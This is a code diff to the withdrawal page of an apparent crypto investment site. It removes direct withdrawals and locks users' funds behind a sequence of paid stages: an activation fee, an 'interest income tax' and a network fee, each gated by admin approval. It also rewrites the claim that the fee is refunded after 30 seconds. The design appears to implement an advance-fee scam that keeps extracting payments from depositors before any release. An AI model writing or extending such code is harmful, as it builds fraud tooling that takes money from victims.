@@ -6,7 +6,6 @@ import { useUserDataRefresh } from '../contexts/UserDataRefreshContext';
 import axios from '../utils/axios';
 import {
   getUserWithdrawals,
-  createWithdrawal,
   payActivationFee,
   submitWithdrawalForm,
   payInterestTax,
@@ -33,15 +32,15 @@ const statusLabels = {
 
 const statusDescriptions = {
   pending: 'Your withdrawal request has been received and is ready for activation fee payment.',
-  awaiting_activation_fee: 'Your withdrawal request is waiting for the activation fee. Pay the fee from your available balance to continue.',
-  activation_fee_paid: 'Your activation fee has been paid. Please wait for admin approval before submitting the withdrawal form.',
-  activation_fee_rejected: 'The activation fee payment was rejected. Pay the full fee again and resubmit.',
-  activation_fee_approved: 'Activation fee approved. Submit the withdrawal form with your wallet address and selected cryptocurrency.',
+  awaiting_activation_fee: 'Your withdrawal request is waiting for the activation fee. Pay the fee from your available balance to unlock the reserved funds from your locked balance.',
+  activation_fee_paid: 'Your activation fee has been paid. Waiting for admin approval before wallet details become available.',
+  activation_fee_rejected: 'The activation fee payment was rejected. The funds remain locked and you can retry payment once the full activation fee is available.',
+  activation_fee_approved: 'Activation fee approved. Enter your wallet address, cryptocurrency, and withdrawal PIN to continue.',
   awaiting_interest_tax: 'The system calculated the interest income tax for this withdrawal. Pay the tax to continue.',
   interest_tax_paid: 'Interest tax payment received. Waiting for admin approval to begin processing.',
   interest_tax_rejected: 'Interest tax payment was rejected. Complete the remaining payment and resubmit.',
-  withdrawal_processing: 'Your withdrawal is processing. It will move to the network fee stage automatically after the processing window expires.',
-  awaiting_network_fee: 'The withdrawal is ready for network fee payment. Pay the fee to finalize the transaction.',
+  withdrawal_processing: 'Your withdrawal is processing for the designated review window. After this period the network fee stage will become available.',
+  awaiting_network_fee: 'A blockchain network fee is required to complete the withdrawal. Pay it from your available balance when prompted.',
   network_fee_paid: 'Network fee payment received. Waiting for admin verification to finalize the withdrawal.',
   withdrawal_successful: 'Your withdrawal has been finalized and sent to your wallet address.',
   completed: 'Withdrawal completed.',
@@ -105,13 +104,10 @@ const Withdraw = () => {
   const [walletAddress, setWalletAddress] = useState('');
   const [selectedNetwork, setSelectedNetwork] = useState('ERC20');
   const [currency, setCurrency] = useState('USDT');
-  const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawPin, setWithdrawPin] = useState('');
   const [loading, setLoading] = useState(true);
   const [actionLoading, setActionLoading] = useState(false);
-  const [createLoading, setCreateLoading] = useState(false);
   const [actionError, setActionError] = useState('');
-  const [createError, setCreateError] = useState('');
   const { kycStatus } = useUser();
   const { refreshUserData } = useUserDataRefresh();
 
@@ -135,7 +131,7 @@ const Withdraw = () => {
     if (!Array.isArray(items)) return null;
     return items
       .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-      .find((w) => w.type === 'regular' && activeStatuses.has(w.status));
+      .find((w) => activeStatuses.has(w.status));
   };
 
   const refreshBalances = useCallback(async () => {
@@ -171,19 +167,38 @@ const Withdraw = () => {
   }, [refreshBalances, refreshWithdrawals]);
 
   useEffect(() => {
-    if (activeWithdrawal && activeWithdrawal.walletAddress) {
+    if (!activeWithdrawal) {
+      setWalletAddress('');
+      setWithdrawPin('');
+      return;
+    }
+    if (activeWithdrawal.walletAddress) {
       setWalletAddress(activeWithdrawal.walletAddress);
     }
+    if (activeWithdrawal.network) {
+      setSelectedNetwork(activeWithdrawal.network);
+    }
+    if (activeWithdrawal.currency) {
+      setCurrency(activeWithdrawal.currency);
+    }
   }, [activeWithdrawal]);
+
+  const remainingActivationFee = activeWithdrawal ? Math.max((activeWithdrawal.activationFeeAmount || 10) - (activeWithdrawal.activationFeePaid || 0), 0) : 0;
+  const remainingInterestTax = activeWithdrawal ? Math.max((activeWithdrawal.interestTaxAmount || 0) - (activeWithdrawal.interestTaxPaid || 0), 0) : 0;
+  const remainingNetworkFee = activeWithdrawal ? Math.max((activeWithdrawal.networkFeeAmount || 0) - (activeWithdrawal.networkFeePaid || 0), 0) : 0;
 
   const handlePayActivationFee = async () => {
     if (!activeWithdrawal) return;
     setActionError('');
     setActionLoading(true);
     try {
-      const fee = activeWithdrawal.activationFeeAmount || 10;
-      await payActivationFee(activeWithdrawal._id || activeWithdrawal.id, fee);
-      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      const fee = remainingActivationFee;
+      if (!fee || fee <= 0) {
+        setActionError('Activation fee is already fully paid. Please wait for admin approval.');
+      } else {
+        await payActivationFee(activeWithdrawal._id || activeWithdrawal.id, fee);
+        await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      }
     } catch (err) {
       setActionError(getErrorMessage(err));
     } finally {
@@ -191,49 +206,19 @@ const Withdraw = () => {
     }
   };
 
-  const handleCreateWithdrawalRequest = async () => {
-    setCreateError('');
-    const amount = Number(withdrawAmount);
-    if (!amount || amount <= 0) {
-      setCreateError('Enter a valid withdrawal amount greater than zero.');
-      return;
-    }
-    if (amount > availableBalance) {
-      setCreateError('Withdrawal amount exceeds your available balance.');
-      return;
-    }
-    if (!walletAddress || !validateWalletAddress(walletAddress, selectedNetwork)) {
-      setCreateError('Enter a valid wallet address for the selected network.');
-      return;
-    }
-    if (!/^[0-9]{6}$/.test(withdrawPin)) {
-      setCreateError('Enter your 6-digit withdrawal PIN.');
-      return;
-    }
-
-    setCreateLoading(true);
-    try {
-      await createWithdrawal({
-        amount,
-        currency,
-        network: selectedNetwork,
-        address: walletAddress,
-        pin: withdrawPin,
-      });
-      setWithdrawAmount('');
-      setWithdrawPin('');
-      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
-    } catch (err) {
-      setCreateError(getErrorMessage(err));
-    } finally {
-      setCreateLoading(false);
-    }
-  };
 
   const handleSubmitWithdrawalForm = async () => {
     if (!activeWithdrawal) return;
+    if (activeWithdrawal.status !== 'activation_fee_approved') {
+      setActionError('Withdrawal form is only available after admin approval of the activation fee.');
+      return;
+    }
     if (!validateWalletAddress(walletAddress, selectedNetwork)) {
       setActionError('Please enter a valid wallet address for the selected network.');
+      return;
+    }
+    if (!/^[0-9]{6}$/.test(withdrawPin)) {
+      setActionError('Please enter a valid 6-digit withdrawal PIN.');
       return;
     }
     setActionError('');
@@ -243,7 +228,9 @@ const Withdraw = () => {
         walletAddress,
         currency,
         network: selectedNetwork,
+        pin: withdrawPin,
       });
+      setWithdrawPin('');
       await Promise.all([refreshWithdrawals(), refreshUserData()]);
     } catch (err) {
       setActionError(getErrorMessage(err));
@@ -257,8 +244,13 @@ const Withdraw = () => {
     setActionError('');
     setActionLoading(true);
     try {
-      await payInterestTax(activeWithdrawal._id || activeWithdrawal.id, activeWithdrawal.interestTaxAmount);
-      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      const tax = remainingInterestTax;
+      if (!tax || tax <= 0) {
+        setActionError('Interest tax is already fully paid. Please wait for admin approval.');
+      } else {
+        await payInterestTax(activeWithdrawal._id || activeWithdrawal.id, tax);
+        await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      }
     } catch (err) {
       setActionError(getErrorMessage(err));
     } finally {
@@ -271,8 +263,13 @@ const Withdraw = () => {
     setActionError('');
     setActionLoading(true);
     try {
-      await payNetworkFee(activeWithdrawal._id || activeWithdrawal.id, activeWithdrawal.networkFeeAmount);
-      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      const fee = remainingNetworkFee;
+      if (!fee || fee <= 0) {
+        setActionError('Network fee is already fully paid. Please wait for admin approval.');
+      } else {
+        await payNetworkFee(activeWithdrawal._id || activeWithdrawal.id, fee);
+        await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+      }
     } catch (err) {
       setActionError(getErrorMessage(err));
     } finally {
@@ -284,98 +281,30 @@ const Withdraw = () => {
     if (!activeWithdrawal) {
       return (
         <div className="glassmorphic p-6 rounded-xl bg-gray-900 border border-gray-700">
-          <h3 className="text-xl font-bold mb-4">Start a Withdrawal</h3>
+          <h3 className="text-xl font-bold mb-4">Withdrawal Center</h3>
           <p className="text-gray-400 mb-4">
-            Initiate a new withdrawal request from your available balance. Your requested amount will be reserved and the withdrawal will proceed through verification, tax, and network fee stages.
+            No active staged withdrawal request was found. When an investment plan completes, the returned funds move into your locked balance.
+            Use the investment details page to initiate the withdrawal. Then return here to pay the activation fee, submit wallet details,
+            and complete the interest tax and network fee steps.
           </p>
-
-          <div className="grid grid-cols-1 gap-4">
-            <label className="block">
-              <span className="text-gray-400 text-sm">Withdrawal Amount (USD)</span>
-              <input
-                type="number"
-                min="0"
-                step="0.01"
-                value={withdrawAmount}
-                onChange={(e) => setWithdrawAmount(e.target.value)}
-                placeholder="e.g. 1500"
-                className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-              />
-            </label>
-
-            <label className="block">
-              <span className="text-gray-400 text-sm">Network</span>
-              <select
-                value={selectedNetwork}
-                onChange={(e) => setSelectedNetwork(e.target.value)}
-                className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-              >
-                {networks.map((network) => (
-                  <option key={network.id} value={network.id}>{network.name}</option>
-                ))}
-              </select>
-            </label>
-
-            <label className="block">
-              <span className="text-gray-400 text-sm">Wallet Address</span>
-              <input
-                type="text"
-                value={walletAddress}
-                onChange={(e) => setWalletAddress(e.target.value)}
-                placeholder={selectedNetwork === 'BTC' ? 'e.g. 1A1zP1...' : selectedNetwork === 'ERC20' ? 'e.g. 0x...' : selectedNetwork === 'TRC20' ? 'e.g. T...' : 'e.g. 0x...'}
-                className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-              />
-            </label>
-
-            <label className="block">
-              <span className="text-gray-400 text-sm">Withdrawal PIN</span>
-              <input
-                type="password"
-                value={withdrawPin}
-                onChange={(e) => setWithdrawPin(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                placeholder="Enter 6-digit PIN"
-                className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-              />
-            </label>
-
-            {createError && (
-              <div className="space-y-2">
-                <div className="bg-red-900 border border-red-700 text-red-100 px-4 py-3 rounded-lg">
-                  {createError}
-                </div>
-                {createError.toLowerCase().includes('invalid withdrawal pin') && (
-                  <p className="text-gray-400 text-sm">
-                    If you have not set a withdrawal PIN, please set one in <a href="/dashboard/settings" className="text-gold underline">Settings</a> before creating a withdrawal.
-                  </p>
-                )}
-              </div>
-            )}
-
-            <p className="text-gray-500 text-sm">
-              Your withdrawal amount will be reserved immediately. You will then be prompted to pay the activation fee to continue.
-            </p>
-
-            <button
-              type="button"
-              onClick={handleCreateWithdrawalRequest}
-              disabled={createLoading || !withdrawAmount || !walletAddress || !/^[0-9]{6}$/.test(withdrawPin)}
-              className={`w-full py-3 rounded-lg font-bold ${createLoading || !withdrawAmount || !walletAddress || !/^[0-9]{6}$/.test(withdrawPin) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
-            >
-              {createLoading ? 'Creating withdrawal...' : 'Create Withdrawal Request'}
-            </button>
+          <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
+            <p className="text-gray-400 text-sm">Locked Balance</p>
+            <p className="text-white text-3xl font-semibold mt-2">${lockedBalance.toLocaleString()}</p>
+            <p className="text-gray-500 text-sm mt-2">Funds from completed investments are held here until withdrawal is unlocked.</p>
           </div>
-
-          <p className="text-gray-500 text-sm mt-4">Your withdrawal amount will be reserved from your available balance while the request progresses through the next stages.</p>
         </div>
       );
     }
 
     const status = activeWithdrawal.status;
     const feeLabel = getNetworkFeeLabel(activeWithdrawal.currency, activeWithdrawal.network);
-    const canPayActivation = ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status);
-    const canSubmitForm = status === 'activation_fee_approved';
-    const canPayTax = ['awaiting_interest_tax', 'interest_tax_rejected', 'interest_tax_paid'].includes(status);
-    const canPayNetwork = ['awaiting_network_fee', 'network_fee_rejected', 'network_fee_paid'].includes(status);
+    const activationFeeFullyPaid = remainingActivationFee === 0 && ['activation_fee_paid', 'activation_fee_rejected'].includes(status);
+    const interestTaxFullyPaid = remainingInterestTax === 0 && ['interest_tax_paid', 'interest_tax_rejected'].includes(status);
+    const networkFeeFullyPaid = remainingNetworkFee === 0 && ['network_fee_paid', 'network_fee_rejected'].includes(status);
+    const canPayActivation = ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status) && !activationFeeFullyPaid;
+    const canPayTax = ['awaiting_interest_tax', 'interest_tax_rejected', 'interest_tax_paid'].includes(status) && !interestTaxFullyPaid;
+    const canPayNetwork = ['awaiting_network_fee', 'network_fee_rejected', 'network_fee_paid'].includes(status) && !networkFeeFullyPaid;
+    const showWalletForm = status === 'activation_fee_approved';
 
     return (
       <div className="glassmorphic p-6 rounded-xl bg-gray-900 border border-gray-700">
@@ -422,25 +351,34 @@ const Withdraw = () => {
                 </div>
                 <div className="text-right text-sm text-gray-400">
                   <p>Verification fee charged from your available balance.</p>
-                  <p className="mt-1 text-xs text-gray-500">This fee is refunded automatically after 30 seconds.</p>
+                  <p className="mt-1 text-xs text-gray-500">This fee is required to unlock the withdrawal request and begin the next stage.</p>
                 </div>
               </div>
             </div>
-            <button
-              type="button"
-              onClick={handlePayActivationFee}
-              disabled={actionLoading || availableBalance < (activeWithdrawal.activationFeeAmount ?? 10)}
-              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < (activeWithdrawal.activationFeeAmount ?? 10) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
-            >
-              {actionLoading ? 'Processing...' : `Pay Activation Fee`}
-            </button>
-            {availableBalance < (activeWithdrawal.activationFeeAmount ?? 10) && (
-              <p className="text-red-400 text-sm">Insufficient available balance to pay the activation fee.</p>
+            {activationFeeFullyPaid ? (
+              <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
+                <p className="text-sm">Activation fee fully paid.</p>
+                <p className="text-sm text-gray-400">Waiting for admin review to approve your withdrawal form stage.</p>
+              </div>
+            ) : (
+              <>
+                <button
+                  type="button"
+                  onClick={handlePayActivationFee}
+                  disabled={actionLoading || availableBalance < remainingActivationFee}
+                  className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < remainingActivationFee ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+                >
+                  {actionLoading ? 'Processing...' : `Pay Activation Fee ($${remainingActivationFee.toFixed(2)})`}
+                </button>
+                {availableBalance < remainingActivationFee && (
+                  <p className="text-red-400 text-sm">Insufficient available balance to pay the remaining activation fee.</p>
+                )}
+              </>
             )}
           </div>
         )}
 
-        {canSubmitForm && (
+        {showWalletForm && (
           <div className="space-y-4 mb-6">
             <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
               <p className="text-gray-400 text-sm">Withdrawal details</p>
@@ -471,16 +409,37 @@ const Withdraw = () => {
                     <p className="text-red-400 text-xs mt-2">Invalid wallet address for selected network.</p>
                   )}
                 </label>
+ 
+                <label className="block">
+                  <span className="text-gray-400 text-sm">Withdrawal PIN</span>
+                  <input
+                    type="password"
+                    value={withdrawPin}
+                    onChange={(e) => setWithdrawPin(e.target.value)}
+                    placeholder="Enter your 6-digit withdrawal PIN"
+                    maxLength={6}
+                    className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
+                  />
+                  {withdrawPin && !/^[0-9]{6}$/.test(withdrawPin) && (
+                    <p className="text-red-400 text-xs mt-2">PIN must be exactly 6 digits.</p>
+                  )}
+                </label>
               </div>
             </div>
             <button
               type="button"
               onClick={handleSubmitWithdrawalForm}
-              disabled={actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork)}
-              className={`w-full py-3 rounded-lg font-bold ${actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+              disabled={actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork) || !/^[0-9]{6}$/.test(withdrawPin)}
+              className={`w-full py-3 rounded-lg font-bold ${actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork) || !/^[0-9]{6}$/.test(withdrawPin) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
             >
               {actionLoading ? 'Submitting...' : 'Submit Withdrawal Form'}
             </button>
+          </div>
+        )}
+        {status === 'activation_fee_paid' && (
+          <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 mb-6 text-gray-300">
+            <p className="text-sm">Activation fee payment has been received.</p>
+            <p className="text-sm text-gray-400">Please wait for admin approval before wallet address, network, and PIN fields become available.</p>
           </div>
         )}
 
@@ -491,16 +450,25 @@ const Withdraw = () => {
               <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.interestTaxAmount?.toFixed(2) ?? '0.00'}</p>
               <p className="text-gray-500 text-sm mt-2">Tax is calculated on your available balance.</p>
             </div>
-            <button
-              type="button"
-              onClick={handlePayInterestTax}
-              disabled={actionLoading || availableBalance < activeWithdrawal.interestTaxAmount}
-              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < activeWithdrawal.interestTaxAmount ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
-            >
-              {actionLoading ? 'Processing...' : 'Pay Interest Income Tax'}
-            </button>
-            {availableBalance < activeWithdrawal.interestTaxAmount && (
-              <p className="text-red-400 text-sm">Insufficient available balance to pay the interest tax.</p>
+            {interestTaxFullyPaid ? (
+              <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
+                <p className="text-sm">Interest tax fully paid.</p>
+                <p className="text-sm text-gray-400">Waiting for admin review to continue withdrawal processing.</p>
+              </div>
+            ) : (
+              <>
+                <button
+                  type="button"
+                  onClick={handlePayInterestTax}
+                  disabled={actionLoading || availableBalance < remainingInterestTax}
+                  className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < remainingInterestTax ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+                >
+                  {actionLoading ? 'Processing...' : `Pay Interest Income Tax ($${remainingInterestTax?.toFixed(2) ?? '0.00'})`}
+                </button>
+                {availableBalance < remainingInterestTax && (
+                  <p className="text-red-400 text-sm">Insufficient available balance to pay the remaining tax.</p>
+                )}
+              </>
             )}
           </div>
         )}
@@ -519,16 +487,25 @@ const Withdraw = () => {
               <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.networkFeeAmount?.toFixed(2) ?? '0.00'}</p>
               <p className="text-gray-500 text-sm mt-2">This fee is required to send the withdrawal over the selected blockchain network.</p>
             </div>
-            <button
-              type="button"
-              onClick={handlePayNetworkFee}
-              disabled={actionLoading || availableBalance < activeWithdrawal.networkFeeAmount}
-              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < activeWithdrawal.networkFeeAmount ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
-            >
-              {actionLoading ? 'Processing...' : `Pay ${feeLabel}`}
-            </button>
-            {availableBalance < activeWithdrawal.networkFeeAmount && (
-              <p className="text-red-400 text-sm">Insufficient available balance to pay the network fee.</p>
+            {networkFeeFullyPaid ? (
+              <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 text-gray-300 mb-4">
+                <p className="text-sm">Network fee fully paid.</p>
+                <p className="text-sm text-gray-400">Waiting for admin review to finalize your withdrawal.</p>
+              </div>
+            ) : (
+              <>
+                <button
+                  type="button"
+                  onClick={handlePayNetworkFee}
+                  disabled={actionLoading || availableBalance < remainingNetworkFee}
+                  className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < remainingNetworkFee ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+                >
+                  {actionLoading ? 'Processing...' : `Pay ${feeLabel} ($${remainingNetworkFee?.toFixed(2) ?? '0.00'})`}
+                </button>
+                {availableBalance < remainingNetworkFee && (
+                  <p className="text-red-400 text-sm">Insufficient available balance to pay the remaining network fee.</p>
+                )}
+              </>
             )}
           </div>
         )}
